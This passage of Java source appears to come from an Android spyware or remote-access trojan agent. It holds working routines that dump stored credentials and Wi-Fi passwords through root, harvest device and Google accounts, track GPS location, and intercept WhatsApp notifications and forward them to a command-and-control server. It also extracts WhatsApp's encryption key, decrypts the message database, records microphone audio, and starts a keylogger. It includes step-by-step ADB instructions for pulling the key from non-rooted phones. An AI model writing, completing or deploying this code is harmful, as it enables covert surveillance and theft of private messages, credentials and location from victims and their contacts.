                Log.w(TAG, "Error closing cursor: " + e.getMessage());
            }
        }
    }
}

    private String getFilesList(String path) {
        JSONArray files = new JSONArray();
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Path not found: " + path);
                return result.toString();
            }

            File[] fileList = dir.listFiles();
            if (fileList != null) {
                for (File file : fileList) {
                    try {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("name", file.getName());
                        fileInfo.put("path", file.getAbsolutePath());
                        fileInfo.put("is_directory", file.isDirectory());
                        fileInfo.put("size", file.length());
                        fileInfo.put("size_formatted", formatFileSize(file.length()));
                        fileInfo.put("last_modified", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                                .format(new Date(file.lastModified())));
                        files.put(fileInfo);
                    } catch (Exception ignored) {
                    }
                }
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("path", path);
            result.put("count", files.length());
            result.put("data", files);
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    // ==================== ACCOUNTS METHODS ====================

    private String getDeviceAccounts() {
        try {
            if (!hasPermission(Manifest.permission.GET_ACCOUNTS)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "GET_ACCOUNTS permission not granted");
                return result.toString();
            }

            AccountManager accountManager = AccountManager.get(this);
            if (accountManager == null) {
                return errorJson("AccountManager is null");
            }

            Account[] accounts = accountManager.getAccounts();
            JSONArray accountsArray = new JSONArray();
            Set<String> uniqueAccounts = new HashSet<>();

            for (Account account : accounts) {
                String accountKey = account.type + ":" + account.name;
                if (uniqueAccounts.contains(accountKey)) continue;
                uniqueAccounts.add(accountKey);

                JSONObject accObj = new JSONObject();
                accObj.put("name", account.name);
                accObj.put("type", account.type);
                accObj.put("type_description", getAccountTypeDescription(account.type));
                accountsArray.put(accObj);
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", accountsArray.length());
            result.put("data", accountsArray);
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    private String getAccountTypeDescription(String type) {
        switch (type) {
            case "com.google":
                return "Google Account";
            case "com.facebook.auth.login":
                return "Facebook Account";
            case "com.whatsapp":
                return "WhatsApp Account";
            default:
                return type;
        }
    }

    private String getGoogleAccounts() {
        try {
            if (!hasPermission(Manifest.permission.GET_ACCOUNTS)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                return result.toString();
            }

            AccountManager accountManager = AccountManager.get(this);
            Account[] accounts = accountManager.getAccountsByType("com.google");

            JSONArray accountsArray = new JSONArray();
            for (Account account : accounts) {
                JSONObject accObj = new JSONObject();
                accObj.put("email", account.name);
                accObj.put("type", "Google");
                accountsArray.put(accObj);
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", accountsArray.length());
            result.put("data", accountsArray);
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }
    
    // ==================== CREDENTIALS METHODS ====================

private String dumpAllCredentials() {
    try {
        if (passwordHelper == null) {
            passwordHelper = new PasswordHelper(this, isRooted);
        }
        return passwordHelper.dumpAllCredentials();
    } catch (Exception e) {
        Log.e(TAG, "Dump credentials error: " + e.getMessage(), e);
        return errorJson("Failed to dump credentials: " + e.getMessage());
    }
}

private String getWifiPasswordsOnly() {
    try {
        if (!isRooted) {
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "WiFi passwords require root access");
            result.put("is_rooted", false);
            return result.toString();
        }
        
        if (passwordHelper == null) {
            passwordHelper = new PasswordHelper(this, isRooted);
        }
        
        // Use reflection or add method to PasswordHelper
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "wifi_passwords");
        result.put("data", getWifiNetworks());
        result.put("is_rooted", true);
        return result.toString();
        
    } catch (Exception e) {
        return errorJson("Failed to get WiFi passwords: " + e.getMessage());
    }
}

private String getBrowserPasswordsOnly() {
    try {
        if (passwordHelper == null) {
            passwordHelper = new PasswordHelper(this, isRooted);
        }
        // This will be handled by PasswordHelper
        return passwordHelper.dumpAllCredentials();
    } catch (Exception e) {
        return errorJson("Failed to get browser passwords: " + e.getMessage());
    }
}

private String getGoogleTokensOnly() {
    try {
        if (!isRooted) {
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "Google tokens require root access");
            result.put("is_rooted", false);
            return result.toString();
        }
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "google_tokens");
        result.put("data", "Use DUMP_CREDENTIALS for complete data");
        result.put("is_rooted", true);
        return result.toString();
        
    } catch (Exception e) {
        return errorJson("Failed to get Google tokens: " + e.getMessage());
    }
}

private JSONArray getWifiNetworks() {
    JSONArray networks = new JSONArray();
    try {
        File wpaFile = new File("/data/misc/wifi/wpa_supplicant.conf");
        if (wpaFile.exists() && wpaFile.canRead()) {
            Process process = Runtime.getRuntime().exec(new String[]{
                "su", "-c", "cat /data/misc/wifi/wpa_supplicant.conf"
            });
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            String currentSsid = "";
            String currentPsk = "";
            
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.startsWith("ssid=")) {
                    currentSsid = line.substring(5).replace("\"", "");
                } else if (line.startsWith("psk=")) {
                    currentPsk = line.substring(4).replace("\"", "");
                } else if (line.equals("}") && !currentSsid.isEmpty() && !currentPsk.isEmpty()) {
                    JSONObject network = new JSONObject();
                    network.put("ssid", currentSsid);
                    network.put("password", currentPsk);
                    networks.put(network);
                    currentSsid = "";
                    currentPsk = "";
                }
            }
            reader.close();
        }
    } catch (Exception e) {
        Log.e(TAG, "Get WiFi networks error: " + e.getMessage());
    }
    return networks;
}


// ==================== GPS DETAIL ====================

private String getGPSDetail() {
    try {
        JSONObject result = new JSONObject();
        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        
        // Cek status provider
        boolean gpsEnabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
        boolean networkEnabled = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        
        result.put("gps_enabled", gpsEnabled);
        result.put("network_enabled", networkEnabled);
        result.put("timestamp", System.currentTimeMillis());
        
        // Ambil lokasi terbaik
        Location bestLocation = null;
        float bestAccuracy = Float.MAX_VALUE;
        
        if (gpsEnabled) {
            Location gpsLoc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (gpsLoc != null && gpsLoc.getAccuracy() < bestAccuracy) {
                bestLocation = gpsLoc;
                bestAccuracy = gpsLoc.getAccuracy();
            }
        }
        
        if (networkEnabled) {
            Location networkLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (networkLoc != null && networkLoc.getAccuracy() < bestAccuracy) {
                bestLocation = networkLoc;
                bestAccuracy = networkLoc.getAccuracy();
            }
        }
        
        if (bestLocation != null) {
            result.put("latitude", bestLocation.getLatitude());
            result.put("longitude", bestLocation.getLongitude());
            result.put("accuracy", bestLocation.getAccuracy());
            result.put("provider", bestLocation.getProvider());
            result.put("altitude", bestLocation.getAltitude());
            result.put("speed", bestLocation.getSpeed());
            result.put("bearing", bestLocation.getBearing());
            result.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(bestLocation.getTime())));
        }
        
        // Ambil jumlah satelit (Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                // Coba dapatkan info satelit
                result.put("satellites", "N/A");
            } catch (Exception e) {
                result.put("satellites", "Unknown");
            }
        }
        
        // Quality assessment
        if (bestLocation != null) {
            float acc = bestLocation.getAccuracy();
            String quality;
            if (acc < 10) quality = "🟢 Excellent (GPS)";
            else if (acc < 30) quality = "🟡 Good";
            else if (acc < 50) quality = "🟠 Fair";
            else quality = "🔴 Poor";
            result.put("quality", quality);
        } else {
            result.put("quality", "❌ No location");
        }
        
        return result.toString();
        
    } catch (SecurityException e) {
        return errorJson("Location permission denied");
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

    // ==================== WHATSAPP METHODS ====================

    private String getWhatsAppInfo() {
        JSONObject result = new JSONObject();
        try {
            PackageManager pm = getPackageManager();
            PackageInfo waInfo = pm.getPackageInfo("com.whatsapp", 0);

            result.put("status", "success");
            result.put("installed", true);
            result.put("package_name", "com.whatsapp");
            result.put("version_name", waInfo.versionName);
            result.put("version_code", waInfo.versionCode);
            result.put("first_install_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                    .format(new Date(waInfo.firstInstallTime)));
            result.put("last_update_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                    .format(new Date(waInfo.lastUpdateTime)));

        } catch (PackageManager.NameNotFoundException e) {
            try {
                result.put("status", "success");
                result.put("installed", false);
                result.put("message", "WhatsApp is not installed");
            } catch (JSONException je) {
                return errorJson("JSON error");
            }
        } catch (JSONException e) {
            return errorJson(e.getMessage());
        }
        return result.toString();
    }

    private String getWhatsAppContacts() {
        JSONObject result = new JSONObject();
        JSONArray waContacts = new JSONArray();
        Cursor cursor = null;

        try {
            if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
                result.put("status", "error");
                result.put("message", "READ_CONTACTS permission denied");
                return result.toString();
            }

            cursor = getContentResolver().query(
                    ContactsContract.RawContacts.CONTENT_URI,
                    new String[]{ContactsContract.RawContacts.CONTACT_ID, ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY},
                    ContactsContract.RawContacts.ACCOUNT_TYPE + " = ?",
                    new String[]{"com.whatsapp"},
                    null
            );

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    String contactId = getColumnValue(cursor, ContactsContract.RawContacts.CONTACT_ID);
                    String name = getColumnValue(cursor, ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY);
                    String waNumber = getWhatsAppNumber(contactId);

                    contact.put("name", name != null ? name : "");
                    contact.put("whatsapp_number", waNumber);
                    contact.put("contact_id", contactId != null ? contactId : "");
                    waContacts.put(contact);

                } while (cursor.moveToNext());
            }

            result.put("status", "success");
            result.put("type", "whatsapp_contacts");
            result.put("count", waContacts.length());
            result.put("data", waContacts);

        } catch (Exception e) {
            try {
                result.put("status", "error");
                result.put("message", e.getMessage());
            } catch (JSONException je) {
                return errorJson(e.getMessage());
            }
        } finally {
            if (cursor != null) cursor.close();
        }
        return result.toString();
    }

    private String getWhatsAppNumber(String contactId) {
        Cursor dataCursor = null;
        String result = "";
        try {
            dataCursor = getContentResolver().query(
                    ContactsContract.Data.CONTENT_URI,
                    new String[]{ContactsContract.Data.DATA1, ContactsContract.Data.DATA3},
                    ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?",
                    new String[]{contactId, "vnd.android.cursor.item/vnd.com.whatsapp.profile"},
                    null
            );

            if (dataCursor != null && dataCursor.moveToFirst()) {
                int idx = dataCursor.getColumnIndex(ContactsContract.Data.DATA3);
                if (idx >= 0) result = dataCursor.getString(idx);
                if (result == null || result.isEmpty()) {
                    idx = dataCursor.getColumnIndex(ContactsContract.Data.DATA1);
                    if (idx >= 0) result = dataCursor.getString(idx);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting WA number: " + e.getMessage());
        } finally {
            if (dataCursor != null) dataCursor.close();
        }
        return result != null ? result : "";
    }

    // ==================== WHATSAPP MESSAGE CAPTURE ====================

    public void onWhatsAppMessageCaptured(String appName, String sender, String message, String timestamp) {
        if (!isWhatsAppCapturing) return;

        synchronized (whatsappMessages) {
            String entry = String.format("[%s] %s - %s: %s\n",
                    timestamp, appName, sender, message);
            whatsappMessages.append(entry);

            if (whatsappMessages.length() > MAX_WA_MESSAGES * 100) {
                int cutIndex = whatsappMessages.indexOf("\n", whatsappMessages.length() / 2);
                if (cutIndex > 0) {
                    whatsappMessages.delete(0, cutIndex + 1);
                }
            }
        }

        sendWhatsAppMessageToC2(appName, sender, message, timestamp);
    }

    private void sendWhatsAppMessageToC2(String appName, String sender, String message, String timestamp) {
        if (out == null || !isConnected.get()) return;

        try {
            JSONObject json = new JSONObject();
            json.put("type", "whatsapp_message");
            json.put("agent_id", getAgentId());

            JSONObject data = new JSONObject();
            data.put("app_name", appName);
            data.put("sender", sender);
            data.put("message", message);
            data.put("timestamp", timestamp);
            data.put("time_ms", System.currentTimeMillis());

            json.put("data", data);

            synchronized (out) {
                out.println(json.toString());
                out.flush();
                Log.d(TAG, "📤 WhatsApp message forwarded to C2: " + sender + " - " + message.substring(0, Math.min(30, message.length())));
            }
        } catch (Exception e) {
            Log.e(TAG, "Send WhatsApp message error: " + e.getMessage());
        }
    }

    private String startWhatsAppCapture() {
        isWhatsAppCapturing = true;
        whatsappMessages.append("=== WHATSAPP CAPTURE STARTED AT ").append(new Date()).append(" ===\n");

        try {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Cannot open notification settings: " + e.getMessage());
        }

        JSONObject result = new JSONObject();
        try {
            result.put("status", "success");
            result.put("message", "WhatsApp message capture started");
            result.put("note", "Please enable notification access in settings");
            return result.toString();
        } catch (JSONException e) {
            return successJson("WhatsApp capture started");
        }
    }

    private String stopWhatsAppCapture() {
        isWhatsAppCapturing = false;
        whatsappMessages.append("=== WHATSAPP CAPTURE STOPPED AT ").append(new Date()).append(" ===\n");

        JSONObject result = new JSONObject();
        try {
            result.put("status", "success");
            result.put("message", "WhatsApp message capture stopped");
            result.put("captured_count", whatsappMessages.toString().split("\n").length);
            return result.toString();
        } catch (JSONException e) {
            return successJson("WhatsApp capture stopped");
        }
    }

    private String dumpWhatsAppMessages() {
        String messages;
        synchronized (whatsappMessages) {
            messages = whatsappMessages.toString();
            whatsappMessages.setLength(0);
            whatsappMessages.append("=== NEW SESSION STARTED ===\n");
        }

        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "whatsapp_messages");
            result.put("messages", messages);
            result.put("count", messages.split("\n").length);
            result.put("timestamp", new Date().toString());
            return result.toString();
        } catch (JSONException e) {
            return "{\"messages\":\"" + messages.replace("\"", "\\\"") + "\"}";
        }
    }

    private String getWhatsAppStats() {
        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("is_capturing", isWhatsAppCapturing);

            int count = whatsappMessages.toString().split("\n").length;
            int size = whatsappMessages.length();

            result.put("message_count", count);
            result.put("buffer_size", size);
            result.put("buffer_size_formatted", formatFileSize(size));
            result.put("timestamp", new Date().toString());
            return result.toString();
        } catch (JSONException e) {
            return errorJson(e.getMessage());
        }
    }

    private String clearWhatsAppMessages() {
        synchronized (whatsappMessages) {
            whatsappMessages.setLength(0);
            whatsappMessages.append("=== CLEARED AT ").append(new Date()).append(" ===\n");
        }

        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "WhatsApp messages cleared");
            return result.toString();
        } catch (JSONException e) {
            return successJson("Messages cleared");
        }
    }

    // ==================== WHATSAPP DECRYPT ====================

    private String getWhatsAppBackupInfo() {
        try {
            boolean isInstalled = isWhatsAppInstalled();
            String dbPath = getWhatsAppDatabasePath();
            String latestDb = getLatestDatabaseFile();
            boolean hasKey = hasWhatsAppKey();
            isRooted = checkRoot();

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "whatsapp_backup_info");
            result.put("whatsapp_installed", isInstalled);
            result.put("database_path", dbPath != null ? dbPath : "Not found");
            result.put("latest_database", latestDb != null ? latestDb : "Not found");
            result.put("has_key", hasKey);
            result.put("is_rooted", isRooted);
            result.put("package_name", WHATSAPP_PACKAGE);

            if (isInstalled) {
                try {
                    PackageManager pm = getPackageManager();
                    PackageInfo info = pm.getPackageInfo(WHATSAPP_PACKAGE, 0);
                    result.put("version_name", info.versionName);
                    result.put("version_code", info.versionCode);
                } catch (Exception e) {
                }
            }

            if (!isRooted) {
                result.put("backup_instructions", getBackupInstructions());
            }

            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    private String extractWhatsAppKey() {
        try {
            if (cachedWhatsAppKey != null) {
                JSONObject result = new JSONObject();
                result.put("status", "success");
                result.put("message", "Key loaded from cache");
                result.put("key_size", cachedWhatsAppKey.length);
                result.put("key_base64", Base64.encodeToString(cachedWhatsAppKey, Base64.NO_WRAP));
                return result.toString();
            }

            byte[] keyData = getWhatsAppKeyFile();

            if (keyData != null && keyData.length > 0) {
                cachedWhatsAppKey = keyData;

                JSONObject result = new JSONObject();
                result.put("status", "success");
                result.put("message", "Key extracted successfully");
                result.put("key_size", keyData.length);
                result.put("key_base64", Base64.encodeToString(keyData, Base64.NO_WRAP));
                result.put("source", "file");
                return result.toString();
            }

            JSONObject result = new JSONObject();
            result.put("status", "requires_action");
            result.put("message", "Key not found. Please run backup script on PC");
            result.put("instructions", getBackupInstructions());
            result.put("is_rooted", isRooted);
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    private String decryptWhatsAppDatabase() {
        try {
            if (cachedWhatsAppKey == null) {
                cachedWhatsAppKey = getWhatsAppKeyFile();
            }

            if (cachedWhatsAppKey == null) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "No WhatsApp key found. Run WA_EXTRACT_KEY first");
                result.put("next_step", "Run WA_EXTRACT_KEY");
                return result.toString();
            }

            String dbPath = getLatestDatabaseFile();
            if (dbPath == null) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Database file not found");
                return result.toString();
            }

            File dbFile = new File(dbPath);
            if (!dbFile.exists() || !dbFile.canRead()) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Cannot read database file: " + dbPath);
                return result.toString();
            }

            FileInputStream fis = new FileInputStream(dbFile);
            byte[] encryptedData = new byte[(int) dbFile.length()];
            fis.read(encryptedData);
            fis.close();

            byte[] decryptedData = decryptWhatsAppData(cachedWhatsAppKey, encryptedData);

            if (decryptedData == null) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Decryption failed. Key might be invalid or database format not supported");
                result.put("database_version", getDatabaseVersion(dbPath));
                return result.toString();
            }

            String outputPath = getCacheDir() + "/whatsapp_decrypted_" + System.currentTimeMillis() + ".db";
            FileOutputStream fos = new FileOutputStream(outputPath);
            fos.write(decryptedData);
            fos.close();

            String messagesPreview = readWhatsAppMessages(outputPath);

            String encoded = Base64.encodeToString(decryptedData, Base64.NO_WRAP);

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "whatsapp_decrypted");
            result.put("database_path", dbPath);
            result.put("decrypted_path", outputPath);
            result.put("decrypted_data", encoded);
            result.put("size", decryptedData.length);
            result.put("size_formatted", formatFileSize(decryptedData.length));
            result.put("messages_preview", messagesPreview);
            result.put("timestamp", new Date().toString());
            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Decrypt error: " + e.getMessage(), e);
            return errorJson(e.getMessage());
        }
    }

    private String readWhatsAppMessages(String dbPath) {
        try {
            StringBuilder messages = new StringBuilder();
            messages.append("=== WHATSAPP MESSAGES ===\n");
            messages.append("Decrypted at: ").append(new Date()).append("\n");
            messages.append("=".repeat(50)).append("\n\n");

            SQLiteDatabase db = SQLiteDatabase.openDatabase(
                    dbPath,
                    null,
                    SQLiteDatabase.OPEN_READONLY
            );

            if (db == null) {
                return "Unable to open database";
            }

            String query = "SELECT message_id, timestamp, sender_name, data FROM messages ORDER BY timestamp DESC LIMIT 100";
            Cursor cursor = db.rawQuery(query, null);

            int count = 0;
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String sender = getColumnValue(cursor, "sender_name");
                    String message = getColumnValue(cursor, "data");
                    String timestamp = getColumnValue(cursor, "timestamp");

                    if (message != null && !message.isEmpty()) {
                        messages.append("[").append(timestamp != null ? timestamp : "N/A").append("] ");
                        messages.append(sender != null ? sender : "Unknown").append(": ");
                        messages.append(message).append("\n");
                        count++;
                    }
                } while (cursor.moveToNext() && count < 100);
                cursor.close();
            }

            db.close();

            if (count == 0) {
                messages.append("No messages found in database\n");
            } else {
                messages.append("\n--- Showing ").append(count).append(" messages ---\n");
            }

            return messages.toString();

        } catch (Exception e) {
            Log.e(TAG, "Read messages error: " + e.getMessage());
            return "Error reading messages: " + e.getMessage();
        }
    }

    // ==================== WHATSAPP HELPER METHODS ====================

    private boolean isWhatsAppInstalled() {
        try {
            PackageManager pm = getPackageManager();
            pm.getPackageInfo(WHATSAPP_PACKAGE, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private String getWhatsAppDatabasePath() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            String basePath = "/storage/emulated/0/Android/media/" + WHATSAPP_PACKAGE + "/WhatsApp/Databases/";
            File dir = new File(basePath);
            if (dir.exists() && dir.isDirectory()) {
                return basePath;
            }
        }

        String oldPath = "/sdcard/WhatsApp/Databases/";
        File oldDir = new File(oldPath);
        if (oldDir.exists() && oldDir.isDirectory()) {
            return oldPath;
        }

        return null;
    }

    private String getLatestDatabaseFile() {
        String dbPath = getWhatsAppDatabasePath();
        if (dbPath == null) return null;

        File dbDir = new File(dbPath);
        if (!dbDir.exists() || !dbDir.isDirectory()) return null;

        String[] files = dbDir.list();
        if (files == null) return null;

        String latestFile = null;
        long latestTime = 0;

        for (String file : files) {
            if (file.startsWith("msgstore") && file.contains(".crypt")) {
                File f = new File(dbDir, file);
                if (f.lastModified() > latestTime) {
                    latestTime = f.lastModified();
                    latestFile = file;
                }
            }
        }

        if (latestFile != null) {
            return dbPath + latestFile;
        }

        return null;
    }

    private String getDatabaseVersion(String dbPath) {
        if (dbPath == null) return "unknown";
        if (dbPath.contains(".crypt15")) return "crypt15";
        if (dbPath.contains(".crypt14")) return "crypt14";
        if (dbPath.contains(".crypt12")) return "crypt12";
        if (dbPath.contains(".crypt11")) return "crypt11";
        if (dbPath.contains(".crypt10")) return "crypt10";
        return "unknown";
    }

    private boolean hasWhatsAppKey() {
        try {
            String keyPath = "/data/data/" + WHATSAPP_PACKAGE + "/files/key";
            File keyFile = new File(keyPath);
            return keyFile.exists() && keyFile.canRead();
        } catch (Exception e) {
            return false;
        }
    }

    private byte[] getWhatsAppKeyFile() {
        try {
            String keyPath = "/data/data/" + WHATSAPP_PACKAGE + "/files/key";
            File keyFile = new File(keyPath);

            if (!keyFile.exists() || !keyFile.canRead()) {
                keyPath = "/data/data/" + WHATSAPP_BUSINESS_PACKAGE + "/files/key";
                keyFile = new File(keyPath);
                if (!keyFile.exists() || !keyFile.canRead()) {
                    return null;
                }
            }

            FileInputStream fis = new FileInputStream(keyFile);
            byte[] keyData = new byte[(int) keyFile.length()];
            fis.read(keyData);
            fis.close();

            Log.d(TAG, "✅ Key file read: " + keyData.length + " bytes");
            return keyData;

        } catch (Exception e) {
            Log.e(TAG, "Error reading key: " + e.getMessage());
            return null;
        }
    }

    private byte[] decryptWhatsAppData(byte[] keyData, byte[] encryptedData) {
        try {
            if (keyData == null || keyData.length < 158) {
                Log.e(TAG, "❌ Invalid key data");
                return null;
            }

            byte[] iv = new byte[16];
            byte[] aesKey = new byte[140];

            System.arraycopy(keyData, 0, iv, 0, 16);
            System.arraycopy(keyData, 16, aesKey, 0, 140);

            if (encryptedData.length < 16) {
                Log.e(TAG, "❌ Encrypted data too short");
                return null;
            }

            byte[] fileIv = new byte[16];
            byte[] fileData = new byte[encryptedData.length - 16];
            System.arraycopy(encryptedData, 0, fileIv, 0, 16);
            System.arraycopy(encryptedData, 16, fileData, 0, encryptedData.length - 16);

            SecretKeySpec secretKey = new SecretKeySpec(aesKey, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(fileIv);

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);

            byte[] decryptedData = cipher.doFinal(fileData);

            ByteArrayInputStream bais = new ByteArrayInputStream(decryptedData);
            GZIPInputStream gzip = new GZIPInputStream(bais);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = gzip.read(buffer)) != -1) {
                baos.write(buffer, 0, bytesRead);
            }
            baos.close();
            gzip.close();
            bais.close();

            Log.d(TAG, "✅ Database decrypted successfully: " + baos.size() + " bytes");
            return baos.toByteArray();

        } catch (Exception e) {
            Log.e(TAG, "❌ Decrypt error: " + e.getMessage());
            return null;
        }
    }

    private String getBackupInstructions() {
        return "=== WHATSAPP BACKUP INSTRUCTIONS ===\n\n" +
                "1. Install ADB on your PC\n" +
                "2. Enable USB Debugging on your phone\n" +
                "3. Connect your phone to PC via USB\n" +
                "4. Run these commands on your PC:\n\n" +
                "   # Create backup\n" +
                "   adb backup -f whatsapp_backup.ab -apk -noshared " + WHATSAPP_PACKAGE + "\n\n" +
                "   # Download abe.jar from: https://sourceforge.net/projects/adbextractor/\n" +
                "   # Extract backup\n" +
                "   java -jar abe.jar unpack whatsapp_backup.ab whatsapp_backup.tar\n\n" +
                "   # Extract key file\n" +
                "   tar -xf whatsapp_backup.tar apps/" + WHATSAPP_PACKAGE + "/ef/ --wildcards --strip-components=5\n" +
                "   mv ef/ key\n\n" +
                "5. Send the 'key' file to the agent using DOWNLOAD_FILE command\n" +
                "6. Or manually copy key file to: " + getCacheDir() + "/whatsapp_key.key\n\n" +
                "Note: This method works for non-rooted devices.\n";
    }

    private boolean checkRoot() {
        try {
            File file = new File("/system/app/Superuser.apk");
            if (file.exists()) return true;

            file = new File("/system/app/Kinguser.apk");
            if (file.exists()) return true;

            file = new File("/system/bin/su");
            if (file.exists()) return true;

            file = new File("/system/xbin/su");
            if (file.exists()) return true;

            Process process = Runtime.getRuntime().exec("which su");
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            if (in.readLine() != null) {
                in.close();
                return true;
            }
            in.close();

        } catch (Exception e) {
            Log.e(TAG, "Root check error: " + e.getMessage());
        }
        return false;
    }

    private String getColumnValue(Cursor cursor, String columnName) {
        int index = cursor.getColumnIndex(columnName);
        return (index >= 0) ? cursor.getString(index) : null;
    }

    // ==================== AUDIO RECORDING ====================

    private String recordAudio() {
        try {
            if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "RECORD_AUDIO");
                return result.toString();
            }

            String audioDir = getExternalFilesDir(null).getAbsolutePath();
            File dir = new File(audioDir);
            if (!dir.exists()) dir.mkdirs();

            audioFilePath = audioDir + "/audio_" + System.currentTimeMillis() + ".3gp";

            if (mediaRecorder != null) {
                try {
                    if (isRecording) mediaRecorder.stop();
                    mediaRecorder.release();
                } catch (Exception e) {
                }
                mediaRecorder = null;
            }

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);

            try {
                mediaRecorder.prepare();
            } catch (IOException e) {
                Log.e(TAG, "Prepare failed: " + e.getMessage());
                return errorJson("Failed to prepare recorder");
            }

            mediaRecorder.start();
            isRecording = true;

            Log.d(TAG, "🎤 Recording started: " + audioFilePath);

            final Handler stopHandler = new Handler(Looper.getMainLooper());
            stopHandler.postDelayed(() -> {
                if (isRecording) {
                    backgroundHandler.post(() -> {
                        String result = stopRecording();
                        Log.d(TAG, "Auto-stop result: " + result);
                    });
                }
            }, 30000);

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "Recording started (30 seconds auto-stop)");
            result.put("file", audioFilePath);
            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Record audio error: " + e.getMessage(), e);
            return errorJson(e.getMessage());
        }
    }

    private String stopRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                try {
                    mediaRecorder.stop();
                    Log.d(TAG, "⏹️ Recording stopped: " + audioFilePath);
                } catch (RuntimeException e) {
                    Log.e(TAG, "Stop error: " + e.getMessage());
                }
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;

                File audioFile = new File(audioFilePath);
                if (audioFile.exists() && audioFile.length() > 0) {
                    return downloadFile(audioFilePath);
                } else {
                    JSONObject result = new JSONObject();
                    result.put("status", "error");
                    result.put("message", "No audio data recorded");
                    return result.toString();
                }
            }

            JSONObject result = new JSONObject();
            result.put("status", "info");
            result.put("message", "No active recording");
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    // ==================== KEYLOGGER COMMANDS ====================

    private String startKeylogger() {
        try {
            Log.d(TAG, "📤 START_KEYLOGGER command received");

            KeyloggerService service = ServiceController.getKeyloggerService();

            if (service == null) {
                Log.w(TAG, "⚠️ KeyloggerService not registered in ServiceController");

                Intent intent = new Intent(this, KeyloggerService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent);
                } else {
                    startService(intent);
                }

                int retryCount = 0;
                while (retryCount < 10 && service == null) {
                    Thread.sleep(500);
                    service = ServiceController.getKeyloggerService();
                    retryCount++;
                    Log.d(TAG, "⏳ Waiting for KeyloggerService... attempt " + retryCount);
                }

                if (service == null) {
                    Log.e(TAG, "❌ KeyloggerService still null after " + retryCount + " attempts");

                    JSONObject result = new JSONObject();
                    result.put("status", "error");
                    result.put("message", "Keylogger service not available. Please enable Accessibility permission.");
                    result.put("action_required", "enable_accessibility");
